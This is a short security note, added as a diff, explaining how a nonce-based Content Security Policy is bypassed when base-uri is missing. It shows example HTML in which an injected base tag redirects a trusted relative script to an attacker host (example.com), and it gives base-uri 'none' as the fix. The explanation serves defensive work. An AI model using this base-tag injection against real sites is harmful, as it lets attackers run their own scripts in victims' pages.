@@ -1,0 +1,41 @@
+when CSP like this is set:
+
+default-src 'none'; script-src 'nonce-abc123';
+
+even if an attacker injects HTML, they cannot execute code without knowing the nonce. For example:
+
+```
+<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'nonce-abc123';">
+</head>
+<body>
+    <div id=userContent>
+      <script src="https://example.com/my.js"></script>
+    </div>
+    <script nonce=abc123 src="app.js"></script>
+</body>
+</html>
+```
+
+this can be bypassed if `base-uri` directive is not set in CSP. The base ttag is used to change the reference location for all relative paths.
+
+```
+<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'nonce-abc123';">
+</head>
+<body>
+    <div id=userContent>
+      <base href="https://example.com/">
+    </div>
+    <script nonce=abc123 src="app.js"></script>
+</body>
+</html>
+```
+
+because `<base href="https://example.com/"> is added, the script loading `app.js`becomes `https://example.com/app.js`, allowing attackers to load scripts from their own server!
+
+The solution is `base-uri 'none'`
